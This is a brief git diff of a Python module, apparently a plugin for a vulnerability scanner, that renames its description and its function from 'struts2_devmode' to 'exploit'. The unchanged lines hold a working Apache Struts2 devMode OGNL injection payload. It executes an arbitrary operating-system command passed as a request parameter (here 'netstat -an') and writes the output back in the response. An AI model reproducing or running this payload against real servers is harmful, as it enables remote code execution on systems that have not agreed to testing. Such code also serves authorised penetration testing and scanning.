@@ -4,7 +4,7 @@ import requests
 
 author = ""
 scope = ""
-description = "Struts2 远程代码执行漏洞"
+description = "struts2_devmode"
 reference = ""
 options = [
     {
@@ -15,7 +15,7 @@ options = [
     }
 ]
 
-def struts2_devmode(URL):
+def exploit(URL):
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
     URL += exp
